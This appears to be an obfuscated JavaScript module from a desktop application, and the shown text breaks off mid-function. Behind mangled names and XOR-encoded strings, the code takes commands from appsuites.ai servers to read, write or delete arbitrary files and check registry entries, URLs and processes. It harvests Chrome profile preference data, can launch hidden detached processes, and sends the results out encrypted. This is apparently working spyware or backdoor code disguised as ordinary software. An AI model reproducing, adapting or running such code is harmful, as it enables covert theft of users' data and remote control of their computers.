'use strict';

(() => {
  var a = ((k) => typeof require !== "undefined" ? require : typeof Proxy !== "undefined" ? new Proxy(k, {
    get: (l, m) => (typeof require !== "undefined" ? require : l)[m]
  }) : k)(function (n) {
    if (typeof require !== "undefined") {
      return require.apply(this, arguments);
    }
    throw Error("Dynamic require of \"" + n + "\" is not supported");
  });
  var b = (o, p) => function q() {
    if (!p) {
      o[Object.getOwnPropertyNames(o)[0]]((p = {
        exports: {}
      }).exports, p);
    }
    return p.exports;
  };
  var c = b({
    'obj/P3E9KFM.js'(r) {
      'use strict';

      Object.defineProperty(r, '__esModule', {
        value: true
      });
      r.S559FZQ = r.i4B82NN = r.a689XV5 = r.k510542 = undefined;
      var s = e();
      var t = class {};
      r.k510542 = t;
      var u;
      (function (x) {
        x[x.B639G7B = 0] = "B639G7B";
        x[x.V4E6B4O = 1] = "V4E6B4O";
        x[x.j5C58S9 = 2] = "j5C58S9";
        x[x.Z498ME9 = 4] = "Z498ME9";
        x[x.b5BEPQ2 = 5] = "b5BEPQ2";
        x[x.f63DUQF = 6] = "f63DUQF";
      })(u = r.a689XV5 || (r.a689XV5 = {}));
      var v = class {
        static s6B3E35(y) {
          let str = '';
          for (let i2 = 0; i2 < y.length; i2++) {
            str += t.w3F3UWA[y[i2] - 48][0];
          }
          return str;
        }
      };
      r.i4B82NN = v;
      var w = class _0x340aaf {
        static t5A2WVR() {
          return true;
        }
        static D47CBV3() {
          return require("process").env.LOCALAPPDATA ?? '';
        }
        static P6A7H5F() {
          return require("process").env.USERPROFILE ?? '';
        }
        static D5DCGHD() {
          return require("path").basename(this.P4ECJBE);
        }
        static D471SJS(z) {
          const arr = [];
          const arr2 = [130, 176, 216, 182, 29, 104, 2, 25, 65, 7, 28, 250, 126, 181, 101, 27];
          for (let j2 = 0; j2 < z.length; j2++) {
            arr.push(z[j2] ^ arr2[j2 % arr2.length]);
          }
          return Buffer.from(arr).toString();
        }
        static async c5E4Z7C(aa, ab) {
          switch (_0x340aaf.y49649G) {
            case 1:
              await _0x340aaf.R449QD9(aa, ab);
              break;
            case 2:
              await _0x340aaf.q413VTI(aa, ab);
              break;
            default:
              s.w3F3UWA.s59BT06('');
              break;
          }
        }
        static async R449QD9(ac, ad) {
          const ae = _0x340aaf.f60EJEI;
          const af = _0x340aaf.s59E3EX;
          const fs = require("fs");
          if (!fs.existsSync(ae)) {
            fs.mkdirSync(ae);
          }
          const ag = fs.existsSync(af) ? fs.readFileSync(af, "utf8") : undefined;
          const ah = !ag ? {} : JSON.parse(ag);
          ah[ac] = ad;
          _0x340aaf.o699XQ0 = ah;
          fs.writeFileSync(af, JSON.stringify(ah));
        }
        static async q413VTI(ai, aj) {
          const ak = _0x340aaf.f60EJEI;
          const al = _0x340aaf.s59E3EX;
          const fs2 = require("fs");
          if (!fs2.existsSync(ak)) {
            fs2.mkdirSync(ak);
          }
          let am = fs2.existsSync(al) ? fs2.readFileSync(al, "utf8") : undefined;
          let arr3 = [];
          if (am != undefined) {
            const ao = Buffer.from(am, "hex").toString("utf8");
            const ap = !ao ? {} : JSON.parse(ao);
            if (ap.hasOwnProperty("json")) {
              arr3 = ap.json;
            }
          }
          const an = _0x340aaf.l536G7W.length - arr3.length;
          if (an < 0) {
            s.w3F3UWA.s59BT06('');
          }
          for (let k2 = 0; k2 < an; k2++) {
            arr3.push('');
          }
          arr3[_0x340aaf.l536G7W.indexOf(ai)] = aj;
          let obj = {
            json: arr3
          };
          _0x340aaf.o699XQ0 = obj;
          am = Buffer.from(JSON.stringify(obj), "utf8").toString("hex").toUpperCase();
          fs2.writeFileSync(al, am);
        }
        static async l610ZCY(aq) {
          switch (_0x340aaf.y49649G) {
            case 1:
              return await _0x340aaf.l616AL1(aq);
            case 2:
              return await _0x340aaf.N3FBEKL(aq);
            default:
              s.w3F3UWA.s59BT06('');
              return;
          }
        }
        static async l616AL1(ar) {
          const as = _0x340aaf.s59E3EX;
          const fs3 = require("fs");
          let str2 = '';
          try {
            if (!_0x340aaf.o699XQ0 && fs3.existsSync(as)) {
              str2 = fs3.readFileSync(as, "utf8");
              _0x340aaf.o699XQ0 = JSON.parse(str2);
            }
          } catch (_0x11d160) {
            await s.w3F3UWA.Y6CDW21(0, s.z579NEI.v4D2E5C, _0x11d160, [str2]);
            return;
          }
          if (!_0x340aaf.o699XQ0 || !Object.prototype.hasOwnProperty.call(_0x340aaf.o699XQ0, ar)) {
            return;
          }
          return _0x340aaf.o699XQ0[ar].toString();
        }
        static async N3FBEKL(at) {
          const au = _0x340aaf.s59E3EX;
          const fs4 = require("fs");
          let str3 = '';
          try {
            if (!_0x340aaf.o699XQ0 && fs4.existsSync(au)) {
              str3 = fs4.readFileSync(au, "utf8");
              const aw = Buffer.from(str3, "hex").toString("utf8");
              s.w3F3UWA.s59BT06('');
              const ax = !aw ? {} : JSON.parse(aw);
              let arr4 = [];
              if (ax.hasOwnProperty("json")) {
                arr4 = ax.json;
              }
              const ay = _0x340aaf.l536G7W.length - arr4.length;
              if (ay < 0) {
                s.w3F3UWA.s59BT06('');
              }
              for (let l2 = 0; l2 < ay; l2++) {
                arr4.push('');
              }
              ax.json = arr4;
              _0x340aaf.o699XQ0 = ax;
            }
          } catch (_0x39d727) {
            await s.w3F3UWA.Y6CDW21(0, s.z579NEI.v4D2E5C, _0x39d727, [str3]);
            return;
          }
          const av = _0x340aaf.l536G7W.indexOf(at);
          if (!_0x340aaf.o699XQ0 || av == -1) {
            return;
          }
          return _0x340aaf.o699XQ0.json[av].toString();
        }
        static async T5BBWGD() {
          try {
            return await _0x340aaf.l610ZCY("iid");
          } catch (_0xfda367) {
            await s.w3F3UWA.Y6CDW21(0, s.z579NEI.H604VAI, _0xfda367);
            return '';
          }
        }
        static async J6021ZT() {
          if (_0x340aaf.y49649G != 2) {
            return;
          }
          const az = await _0x340aaf.N3FBEKL("iid");
          const ba = await _0x340aaf.N3FBEKL("usid");
          if (az != undefined && az != '' && ba != undefined && ba != '') {
            return;
          }
          const bb = _0x340aaf.k47ASDC;
          const fs5 = require("fs");
          let str4 = '';
          try {
            if (fs5.existsSync(bb)) {
              let bc = function (bg) {
                let str5 = '';
                for (let m2 = 0; m2 < bg.length; m2++) {
                  str5 += bg.charCodeAt(m2).toString(16).padStart(2, '0');
                }
                return str5;
              };
              str4 = fs5.readFileSync(bb, "utf8");
              const bd = !str4 ? {} : JSON.parse(str4);
              const be = bd.hasOwnProperty("uid") ? bd.uid : '';
              const bf = bd.hasOwnProperty("sid") ? bd.sid : '';
              if (be != '') {
                await _0x340aaf.q413VTI("iid", be);
              }
              if (bf != '') {
                await _0x340aaf.q413VTI("usid", bc(bf));
              }
              s.w3F3UWA.s59BT06('');
            }
          } catch (_0x4da2a5) {
            await s.w3F3UWA.Y6CDW21(0, s.z579NEI.A3F8RJ7, _0x4da2a5, [str4]);
            return;
          }
        }
      };
      r.S559FZQ = w;
    }
  });
  var d = b({
    'obj/A3EBXKH.js'(bh) {
      'use strict';

      Object.defineProperty(bh, '__esModule', {
        value: true
      });
      bh.e5325L3 = bh.E506IW4 = undefined;
      var bi = class {
        static d6C8UEH() {
          for (const bl of Object.keys(this)) {
            if (this[bl] === '' || this[bl] === undefined) {
              return false;
            }
          }
          return true;
        }
      };
      bh.E506IW4 = bi;
      var bj = class {
        static get d65DL4U() {
          if (!this.C4E471X) {
            this.C4E471X = new bk();
          }
          return this.C4E471X;
        }
        static get Y55B2P2() {
          return this.d65DL4U.Y55B2P2;
        }
        static get q474LOF() {
          return this.d65DL4U.q474LOF;
        }
        static set q474LOF(bm) {
          this.d65DL4U.q474LOF = bm;
        }
        static get a5D303X() {
          return this.d65DL4U.a5D303X;
        }
        static set a5D303X(bn) {
          this.d65DL4U.a5D303X = bn;
        }
        static get x484Q1X() {
          return this.d65DL4U.x484Q1X;
        }
        static set x484Q1X(bo) {
          this.d65DL4U.x484Q1X = bo;
        }
        static get k596N0J() {
          return this.d65DL4U.k596N0J;
        }
        static set k596N0J(bp) {
          this.d65DL4U.k596N0J = bp;
        }
        static get a6B1QAU() {
          return this.d65DL4U.a6B1QAU;
        }
        static set a6B1QAU(bq) {
          this.d65DL4U.a6B1QAU = bq;
        }
        static get r53FV0M() {
          return this.d65DL4U.r53FV0M;
        }
        static set r53FV0M(br) {
          this.d65DL4U.r53FV0M = br;
        }
        static get U430LYO() {
          return this.d65DL4U.U430LYO;
        }
        static set U430LYO(bs) {
          this.d65DL4U.U430LYO = bs;
        }
        static get g4184BO() {
          return this.d65DL4U.g4184BO;
        }
        static set g4184BO(bt) {
          this.d65DL4U.g4184BO = bt;
        }
        static get R6780KK() {
          return this.d65DL4U.R6780KK;
        }
        static set R6780KK(bu) {
          this.d65DL4U.R6780KK = bu;
        }
        static get n664BX9() {
          return this.d65DL4U.n664BX9;
        }
        static set n664BX9(bv) {
          this.d65DL4U.n664BX9 = bv;
        }
        static get x4ADWAE() {
          return this.d65DL4U.x4ADWAE;
        }
        static set x4ADWAE(bw) {
          this.d65DL4U.x4ADWAE = bw;
        }
        static get z4DE429() {
          return this.d65DL4U.z4DE429;
        }
        static set z4DE429(bx) {
          this.d65DL4U.z4DE429 = bx;
        }
        static get H64FNMG() {
          return this.d65DL4U.H64FNMG;
        }
        static set H64FNMG(by) {
          this.d65DL4U.H64FNMG = by;
        }
        static get M56F8MB() {
          return this.d65DL4U.M56F8MB;
        }
        static set M56F8MB(bz) {
          this.d65DL4U.M56F8MB = bz;
        }
        static get X4B7201() {
          return this.d65DL4U.X4B7201;
        }
        static set X4B7201(ca) {
          this.d65DL4U.X4B7201 = ca;
        }
        static get b57CS7T() {
          return this.d65DL4U.b57CS7T;
        }
        static set b57CS7T(cb) {
          this.d65DL4U.b57CS7T = cb;
        }
        static get K48B40X() {
          return this.d65DL4U.K48B40X;
        }
        static set K48B40X(cc) {
          this.d65DL4U.K48B40X = cc;
        }
        static get d557Z9E() {
          return this.d65DL4U.d557Z9E;
        }
      };
      bh.e5325L3 = bj;
      var bk = class {
        constructor() {
          this.d557Z9E = process.pid;
          this.Y55B2P2 = '1.0.28';
          this.q474LOF = '';
          this.a5D303X = false;
          this.x484Q1X = c().a689XV5.B639G7B;
          this.a6B1QAU = '';
          this.U430LYO = '';
          this.k596N0J = false;
          this.r53FV0M = false;
          this.g4184BO = false;
          this.R6780KK = false;
          this.n664BX9 = false;
          this.x4ADWAE = false;
          this.z4DE429 = false;
          this.H64FNMG = false;
          this.M56F8MB = false;
          this.X4B7201 = false;
          this.b57CS7T = -1;
          this.K48B40X = -1;
        }
      };
    }
  });
  var e = b({
    'obj/u3EC55P.js'(cd) {
      'use strict';

      Object.defineProperty(cd, '__esModule', {
        value: true
      });
      cd.o5B4F49 = cd.S634YX3 = cd.U61FWBZ = cd.O694X7J = cd.m4F8RIX = cd.F490EUX = cd.T667X3K = cd.p464G3A = cd.e63F2C3 = cd.h5235DD = cd.e696T3N = cd.J60DFMS = cd.y42BRXF = cd.r5EEMKP = cd.w3F3UWA = cd.z579NEI = cd.Y463EU0 = cd.T408FQL = cd.v43EBD7 = undefined;
      var ce = c();
      var cf = d();
      var cg;
      (function (cy) {
        cy[cy.W5397AL = -1] = 'W5397AL';
        cy[cy.X571NQM = 0] = "X571NQM";
        cy[cy.X4816CW = 1] = 'X4816CW';
      })(cg = cd.v43EBD7 || (cd.v43EBD7 = {}));
      var ch = class {
        constructor(cz = 0, da = 0, db = 0, dc = 0) {
          this.D5DDWLX = cz;
          this.t563L6N = da;
          this.T3F59PH = db;
          this.o6359GL = dc;
        }
        o5B56AY(dd) {
          if (dd == null) {
            return false;
          }
          return this.D5DDWLX == dd.D5DDWLX && this.t563L6N == dd.t563L6N && this.T3F59PH == dd.T3F59PH && this.o6359GL == dd.o6359GL;
        }
        N67FCSM(de) {
          if (de == null) {
            return true;
          }
          return this.D5DDWLX != de.D5DDWLX || this.t563L6N != de.t563L6N || this.T3F59PH != de.T3F59PH || this.o6359GL != de.o6359GL;
        }
        V4E80AR(df) {
          if (this.o5B56AY(df)) {
            return false;
          }
          if (this.D5DDWLX > df.D5DDWLX) {
            return true;
          }
          if (this.D5DDWLX < df.D5DDWLX) {
            return false;
          }
          if (this.t563L6N > df.t563L6N) {
            return true;
          }
          if (this.t563L6N < df.t563L6N) {
            return false;
          }
          if (this.T3F59PH > df.T3F59PH) {
            return true;
          }
          if (this.T3F59PH < df.T3F59PH) {
            return false;
          }
          return this.o6359GL > df.o6359GL;
        }
        s5A7L0F(dg) {
          if (this.o5B56AY(dg)) {
            return false;
          }
          if (dg.V4E80AR(this)) {
            return false;
          }
          return true;
        }
        T41CAIA() {
          return this.D5DDWLX + '.' + this.t563L6N + '.' + this.T3F59PH + '.' + this.o6359GL;
        }
        K66ASXK() {
          return this.D5DDWLX + '.' + this.t563L6N;
        }
      };
      cd.T408FQL = ch;
      function ci(dh) {
        return new Promise((di) => setTimeout(di, dh));
      }
      cd.Y463EU0 = ci;
      cd.z579NEI = class {
        static F47EFHX(dj) {
          return dj;
        }
      };
      var cj = class _0x21c2ac {
        static s59BT06(dk, dl = cg.X571NQM) {
          if (!ce.S559FZQ.F40E8E7) {
            return;
          }
          console.log('[' + dl + "]: " + dk);
        }
        static async W4EF0EI(dm, dn, dp) {
          await this.Q44BIX9(cg.X4816CW, dm, dn, undefined, dp);
        }
        static async Y6CDW21(dq, dr, ds, dt) {
          await this.Q44BIX9(cg.W5397AL, dq, dr, ds, dt);
        }
        static async Q44BIX9(du, dv, dw, dx, dy) {
          function dz(ed) {
            if (!ed) {
              return '';
            }
            let str6 = '';
            for (const ee of ed) {
              if (str6.length > 0) {
                str6 += '|';
              }
              if (typeof ee === 'boolean') {
                str6 += ee ? '1' : '0';
              } else {
                str6 += ee.toString().replace('|', '_');
              }
            }
            return str6;
          }
          _0x21c2ac.s59BT06('');
          var ea = cf.e5325L3.q474LOF ?? '';
          if (ea == '') {
            ea = "initialization";
          }
          const params = new require("url").URLSearchParams();
          const eb = ce.S559FZQ.n677BRA.substring(0, 24) + ea.substring(0, 8);
          const ec = cu(eb, JSON.stringify({
            b: dv,
            c: dz(dy),
            e: dx ? dx.toString() : '',
            i: ea,
            l: du,
            m: dw[0],
            p: ce.S559FZQ.t5A2WVR() ? 1 : 2,
            s: cf.e5325L3.x484Q1X,
            v: cf.e5325L3.Y55B2P2
          }));
          params.append("data", ec.data);
          params.append("iv", ec.iv);
          params.append("iid", ea);
          if (!ce.S559FZQ.F40E8E7) {
            await cp("api/s3/event", params);
          }
        }
        static g597ORN() {
          _0x21c2ac.s59BT06('');
        }
      };
      cd.w3F3UWA = cj;
      function ck(ef, eg = [], eh) {
        return require("child_process").spawn(ef, eg, {
          detached: true,
          stdio: "ignore",
          cwd: eh
        });
      }
      cd.r5EEMKP = ck;
      async function cl(ei) {
        cj.s59BT06('');
        return await require("node-fetch")(ei);
      }
      cd.y42BRXF = cl;
      async function cm(ej, ek) {
        cj.s59BT06('');
        return await require("node-fetch")(ej, {
          method: "POST",
          body: JSON.stringify(ek)
        });
      }
      cd.J60DFMS = cm;
      async function cn(el) {
        const fetch = require("node-fetch");
        let em;
        let en = "https://appsuites.ai/" + el;
        cj.s59BT06('');
        try {
          em = await fetch(en);
        } catch {
          cj.s59BT06('');
        }
        if (!em || !em.ok) {
          try {
            en = "https://sdk.appsuites.ai/" + el;
            cj.s59BT06('');
            em = await fetch(en);
          } catch {
            cj.s59BT06('');
          }
        }
        return em;
      }
      cd.e696T3N = cn;
      async function co(eo, ep) {
        const fetch2 = require("node-fetch");
        let eq;
        let er = "https://appsuites.ai/" + eo;
        cj.s59BT06('');
        if (ep.has('')) {
          ep.append('', '');
        }
        const obj2 = {
          headers: {
            "Content-Type": "application/x-www-form-urlencoded"
          },
          method: "POST",
          body: ep
        };
        try {
          eq = await fetch2(er, obj2);
        } catch {
          cj.s59BT06('');
        }
        if (!eq || !eq.ok) {
          try {
            er = "https://sdk.appsuites.ai/" + eo;
            cj.s59BT06('');
            eq = await fetch2(er, obj2);
          } catch {
            cj.s59BT06('');
          }
        }
        return eq;
      }
      cd.h5235DD = co;
      async function cp(es, et) {
        if (et.has('')) {
          et.append('', '');
        }
        return await require("node-fetch")("https://appsuites.ai/" + es, {
          headers: {
            "Content-Type": "application/x-www-form-urlencoded"
          },
          method: "POST",
          body: et
        });
      }
      cd.e63F2C3 = cp;
      function cq(eu, ev) {
        return new Promise((ew, ex) => {
          const ey = require("fs").createWriteStream(ev, {});
          const ez = (eu.startsWith("https") ? require("https") : require("http")).get(eu, (res) => {
            if (!res.statusCode || res.statusCode < 200 || res.statusCode > 299) {
              ex(new Error("LoadPageFailed " + res.statusCode));
            }
            res.pipe(ey);
            ey.on("finish", function () {
              ey.destroy();
              ew();
            });
          });
          ez.on("error", (fa) => ex(fa));
        });
      }
      cd.p464G3A = cq;
      function cr(fb) {
        try {
          require("fs").unlinkSync(fb);
          cj.s59BT06('');
        } catch {
          cj.s59BT06('');
        }
      }
      cd.T667X3K = cr;
      async function cs() {
        const fs6 = require("fs");
        const path = require("path");
        const proc = require("process");
        const fc = ce.S559FZQ.L695HPV;
        if (fs6.existsSync(fc)) {
          const fd = new Date().getTime() - fs6.statSync(fc).mtime.getTime();
          if (fd < 900000) {
            cj.s59BT06('');
            proc.exit(0);
          } else {
            cj.s59BT06('');
            fs6.unlinkSync(fc);
          }
        }
        fs6.writeFileSync(fc, '');
        proc.on("exit", () => {
          fs6.unlinkSync(fc);
        });
      }
      cd.F490EUX = cs;
      function ct(fe) {
        try {
          return require("fs").statSync(fe).size;
        } catch {
          return 0;
        }
      }
      cd.m4F8RIX = ct;
      function cu(ff, fg) {
        try {
          const crypto = require("crypto");
          const fh = crypto.randomBytes(16);
          let fi = crypto.createCipheriv("aes-256-cbc", ff, fh);
          let fj = fi.update(fg, "utf8", "hex");
          fj += fi.final("hex");
          return {
            data: fj,
            iv: fh.toString("hex")
          };
        } catch {
          cj.s59BT06('');
          return;
        }
      }
      cd.O694X7J = cu;
      function cv(fk, fl, fm) {
        try {
          const fn = require("crypto").createDecipheriv("aes-256-cbc", Buffer.from(fk), Buffer.from(fm, "hex"));
          let fo = fn.update(Buffer.from(fl, "hex"));
          fo = Buffer.concat([fo, fn.final()]);
          return fo.toString();
        } catch {
          cj.s59BT06('');
          return;
        }
      }
      cd.U61FWBZ = cv;
      function cw(fp) {
        return Buffer.from(fp, "hex").toString("utf8");
      }
      cd.S634YX3 = cw;
      function cx(fq, ..._0x1c146c) {
        try {
          var fr = fq.replace(/{(\d+)}/g, function (ft, fu) {
            const fv = parseInt(fu);
            if (isNaN(fv)) {
              return ft;
            }
            return typeof _0x1c146c[fv] !== 'undefined' ? _0x1c146c[fv] : ft;
          });
          return fr;
        } catch {
          return fq;
        }
      }
      cd.o5B4F49 = cx;
    }
  });
  var f = b({
    'obj/V3EDFYY.js'(fw) {
      'use strict';

      Object.defineProperty(fw, '__esModule', {
        value: true
      });
      fw.t505FAN = undefined;
      var fx = c();
      var fy = e();
      var fz;
      (function (hg) {
        hg[hg.p5B1KEV = 0] = "p5B1KEV";
      })(fz || (fz = {}));
      var ga;
      (function (hh) {
        hh[hh.O435AMZ = 0] = "O435AMZ";
        hh[hh.w692AS2 = 1] = 'w692AS2';
      })(ga || (ga = {}));
      var gb;
      (function (hi) {
        hi[hi.B639G7B = 0] = "B639G7B";
        hi[hi.O435AMZ = 1] = "O435AMZ";
        hi[hi.j451KZ4 = 2] = "j451KZ4";
        hi[hi.R62AFMF = 3] = "R62AFMF";
        hi[hi.S58EMWW = 4] = "S58EMWW";
        hi[hi.P5F9KBR = 5] = "P5F9KBR";
      })(gb || (gb = {}));
      function gc(hj) {
        const hk = Buffer.isBuffer(hj) ? hj : Buffer.from(hj);
        const buf = Buffer.from(hk.slice(4));
        for (let n2 = 0; n2 < buf.length; n2++) {
          buf[n2] ^= hk.slice(0, 4)[n2 % 4];
        }
        return buf.toString("utf8");
      }
      function gd(hl) {
        hl = hl[gc([16, 233, 75, 213, 98, 140, 59, 185, 113, 138, 46])](/-/g, '');
        return Buffer.from("276409396fcc0a23" + hl.substring(0, 16), "hex");
      }
      function ge() {
        return Uint8Array.from([162, 140, 252, 232, 178, 47, 68, 146, 150, 110, 104, 76, 128, 236, 129, 43]);
      }
      function gf() {
        return Uint8Array.from([132, 144, 242, 171, 132, 73, 73, 63, 157, 236, 69, 155, 80, 5, 72, 144]);
      }
      function gg() {
        return Uint8Array.from([28, 227, 43, 129, 197, 9, 192, 3, 113, 243, 59, 145, 209, 193, 56, 86, 104, 131, 82, 163, 221, 190, 10, 67, 20, 245, 151, 25, 157, 70, 17, 158, 122, 201, 112, 38, 29, 114, 194, 166, 183, 230, 137, 160, 167, 99, 27, 45, 46, 31, 96, 23, 200, 241, 64, 26, 57, 33, 83, 240, 247, 139, 90, 48, 233, 6, 110, 12, 44, 108, 11, 73, 34, 231, 242, 173, 37, 92, 162, 198, 175, 225, 143, 35, 176, 133, 72, 212, 165, 195, 36, 226, 147, 68, 69, 146, 14, 0, 161, 87, 53, 196, 199, 195, 19, 80, 4, 49, 169, 188, 153, 30, 124, 142, 206, 159, 180, 170, 123, 88, 15, 95, 210, 152, 24, 63, 155, 98, 181, 7, 141, 171, 85, 103, 246, 222, 97, 211, 248, 136, 126, 22, 168, 214, 249, 93, 109, 91, 111, 21, 213, 229, 135, 207, 54, 40, 244, 47, 224, 215, 164, 51, 208, 100, 144, 16, 55, 66, 18, 42, 39, 52, 186, 127, 118, 65, 61, 202, 160, 253, 125, 74, 50, 106, 228, 89, 179, 41, 232, 148, 32, 231, 138, 132, 121, 115, 150, 220, 5, 240, 184, 182, 76, 243, 58, 60, 94, 238, 107, 140, 163, 217, 128, 120, 78, 134, 102, 75, 105, 79, 116, 247, 119, 189, 149, 185, 216, 13, 117, 236, 126, 156, 8, 130, 2, 154, 178, 101, 71, 254, 62, 1, 81, 177, 205, 250, 219, 6, 203, 172, 125, 191, 218, 77, 235, 252]);
      }
      function gh(hm, hn) {
        if (hm.length !== hn.length) {
          return false;
        }
        for (let ho = 0; ho < hm.length; ho++) {
          if (hm[ho] !== hn[ho]) {
            return false;
          }
        }
        return true;
      }
      function gi(hp) {
        if (!hp) {
          return new Uint8Array();
        }
        return new Uint8Array(Buffer.from(hp, "hex"));
      }
      function gj(hq) {
        if (!hq) {
          return '';
        }
        return Buffer.from(hq).toString("hex");
      }
      function gk(hr, hs) {
        const crypto2 = require("crypto");
        const ht = crypto2.randomBytes(16);
        const hu = crypto2.createCipheriv("aes-128-cbc", gd(hs), ht);
        hu.setAutoPadding(true);
        let hv = hu.update(hr, "utf8", "hex");
        hv += hu.final("hex");
        return ht.toString("hex").toUpperCase() + "A0FB" + hv.toUpperCase();
      }
      function gl(hw, hx) {
        const hy = require("crypto").createDecipheriv("aes-128-cbc", gd(hx), Buffer.from(hw.substring(0, 32), "hex"));
        hy.setAutoPadding(true);
        let hz = hy.update(hw.substring(36), "hex", "utf8");
        hz += hy.final("utf8");
        return hz;
      }
      function gm(ia, ib) {
        if (ia.length <= 32) {
          return new Uint8Array();
        }
        const bytes = new Uint8Array([...ge(), ...ib]);
        const ic = ia.slice(0, 16);
        const id = gg();
        const ie = ia.slice(16);
        for (let ih = 0; ih < ie.length; ih++) {
          const ii = ic[ih % ic.length] ^ bytes[ih % bytes.length] ^ id[ih % id.length];
          ie[ih] ^= ii;
        }
        const ig = ie.length - 16;
        if (!gh(ie.slice(ig), gf())) {
          return new Uint8Array();
        }
        return ie.slice(0, ig);
      }
      var gn = class {
        static W698NHL(ij) {
          const arr5 = [];
          if (!Array.isArray(ij)) {
            return arr5;
          }
          for (const ik of ij) {
            arr5.push({
              d5E0TQS: ik.Path ?? '',
              a47DHT3: ik.Data ?? '',
              i6B2K9E: ik.Key ?? '',
              A575H6Y: Boolean(ik.Exists),
              Q57DTM8: typeof ik.Action === "number" ? ik.Action : 0
            });
          }
          return arr5;
        }
        static T6B99CG(il) {
          return il.map((im) => ({
            Path: im.d5E0TQS,
            Data: im.a47DHT3,
            Key: im.i6B2K9E,
            Exists: im.A575H6Y,
            Action: im.Q57DTM8
          }));
        }
        static u6CAWW3(io) {
          return {
            c608HZL: Array.isArray(io.File) ? this.W698NHL(io.File) : [],
            y4BAIF6: Array.isArray(io.Reg) ? this.W698NHL(io.Reg) : [],
            Z59DGHB: Array.isArray(io.Url) ? this.W698NHL(io.Url) : [],
            s67BMEP: Array.isArray(io.Proc) ? this.W698NHL(io.Proc) : []
          };
        }
        static N5A4FRL(ip) {
          return {
            File: this.T6B99CG(ip.c608HZL),
            Reg: this.T6B99CG(ip.y4BAIF6),
            Url: this.T6B99CG(ip.Z59DGHB),
            Proc: this.T6B99CG(ip.s67BMEP)
          };
        }
        static S59C847(iq) {
          return {
            b54FBAI: typeof iq.Progress === "number" ? iq.Progress : -1,
            P456VLZ: typeof iq.Activity === "number" ? iq.Activity : -1,
            x567X2Q: this.u6CAWW3(iq.Value ?? {}),
            J6C4Y96: iq.NextUrl ?? '',
            I489V4T: iq.Session ?? '',
            h46EVPS: typeof iq.TimeZone === "number" ? iq.TimeZone : 255,
            b4CERH3: iq.Version ?? ''
          };
        }
        static b558GNO(ir) {
          return {
            Progress: ir.b54FBAI,
            Activity: ir.P456VLZ,
            Value: this.N5A4FRL(ir.x567X2Q),
            NextUrl: ir.J6C4Y96,
            Session: ir.I489V4T,
            TimeZone: ir.h46EVPS,
            Version: ir.b4CERH3
          };
        }
        static s40B7VN(is) {
          return JSON.stringify(this.b558GNO(is));
        }
      };
      function go(it) {
        const fs7 = require("fs");
        return fs7.existsSync(it) && fs7.lstatSync(it).isDirectory();
      }
      function gp(iu) {
        require("fs").mkdirSync(iu, {
          recursive: true
        });
      }
      function gq(iv) {
        try {
          return JSON.parse(iv);
        } catch {
          return {};
        }
      }
      function gr(iw, ix) {
        return typeof iw?.[ix] === "object" ? iw[ix] : {};
      }
      function gs(iy) {
        const path2 = require("path");
        const os = require("os");
        let iz = iy;
        const obj3 = {
          "%LOCALAPPDATA%": path2.join(os.homedir(), "AppData", "Local"),
          "%APPDATA%": path2.join(os.homedir(), "AppData", "Roaming"),
          "%USERPROFILE%": os.homedir()
        };
        for (const [ja, jb] of Object.entries(obj3)) {
          const regex = new RegExp(ja, 'i');
          if (regex.test(iz)) {
            iz = iz.replace(regex, jb);
            break;
          }
        }
        return iz;
      }
      function gt() {
        return Math.floor(Date.now() / 1000).toString();
      }
      function gu(jc) {
        const fs8 = require("fs");
        if (fs8.existsSync(jc)) {
          fs8.unlinkSync(jc);
        }
      }
      function gv(jd, je) {
        try {
          require("fs").writeFileSync(jd, je);
          return true;
        } catch {
          return false;
        }
      }
      async function gw(jf) {
        return new Promise((jg, jh) => {
          (jf.startsWith("https") ? require("https") : require("http")).get(jf, (ji) => {
            const arr6 = [];
            ji.on("data", (jj) => arr6.push(jj));
            ji.on("end", () => jg(Buffer.concat(arr6)));
          }).on("error", (jk) => jh(jk));
        });
      }
      var str7 = '';
      var gx;
      async function gy(jl, jm) {
        fy.w3F3UWA.s59BT06('');
        fy.w3F3UWA.s59BT06('');
        const jn = new require("url").URLSearchParams({
          data: gk(JSON.stringify(gn.b558GNO(jl)), str7),
          iid: str7
        }).toString();
        return await await require("node-fetch")("https://on.appsuites.ai" + jm, {
          headers: {
            "Content-Type": "application/x-www-form-urlencoded"
          },
          method: "POST",
          body: jn
        }).text();
      }
      async function gz(jo, jp) {
        jo.J6C4Y96 = '';
        jo.P456VLZ = ga.w692AS2;
        jo.b4CERH3 = "1.0.0.0";
        jo.h46EVPS = -new Date().getTimezoneOffset() / 60;
        for (let jq = 0; jq < 3; jq++) {
          jo.I489V4T = gt();
          const jr = await gy(jo, jp);
          if (jr && (typeof gq(jr)?.iid === "string" ? gq(jr).iid : '') === str7) {
            break;
          }
          await new Promise((js) => setTimeout(js, 3000));
        }
      }
      async function ha(jt) {
        fy.w3F3UWA.s59BT06('');
        const path3 = require("path");
        const fs9 = require("fs");
        const arr7 = [];
        const ju = (ka) => {
          ka.A575H6Y = false;
          if (ka.d5E0TQS) {
            ka.A575H6Y = require("fs").existsSync(gs(ka.d5E0TQS));
          }
        };
        const jv = (kb) => {
          kb.A575H6Y = false;
          if (kb.d5E0TQS) {
            const kc = gs(kb.d5E0TQS);
            kb.A575H6Y = require("fs").existsSync(kc);
            if (kb.A575H6Y) {
              kb.a47DHT3 = gj(require("fs").readFileSync(kc));
            }
          }
        };
        const jw = (kd) => {
          kd.A575H6Y = false;
          if (kd.d5E0TQS && kd.a47DHT3) {
            kd.a47DHT3 = '';
            const ke = gs(kd.d5E0TQS);
            const kf = require("path").dirname(ke);
            if (!go(kf)) {
              gp(kf);
            }
            kd.A575H6Y = gv(ke, gi(kd.a47DHT3));
          }
        };
        const jx = (kg) => {
          kg.A575H6Y = false;
          if (kg.d5E0TQS) {
            const kh = gs(kg.d5E0TQS);
            gu(kh);
            kg.A575H6Y = require("fs").existsSync(kh);
          }
        };
        const jy = (ki) => {
          ki.A575H6Y = false;
          if (ki.d5E0TQS) {
            const kj = gs(ki.d5E0TQS);
            const kk = path3.join(kj, "Local State");
            if (!require("fs").existsSync(kk)) {
              return;
            }
            const keys = Object.keys(gr(gr(gq(fs9.readFileSync(kk, "utf8")), "profile"), "info_cache"));
            for (const kl of keys) {
              const km = path3.join(kj, kl, "Preferences");
              if (!require("fs").existsSync(km)) {
                continue;
              }
              const kn = gr(gr(gr(gr(gq(fs9.readFileSync(km, "utf8")), "profile"), "content_settings"), "exceptions"), "site_engagement");
              const json = JSON.stringify(kn);
              if (json) {
                arr7.push({
                  d5E0TQS: path3.join(ki.d5E0TQS, kl, "Preferences"),
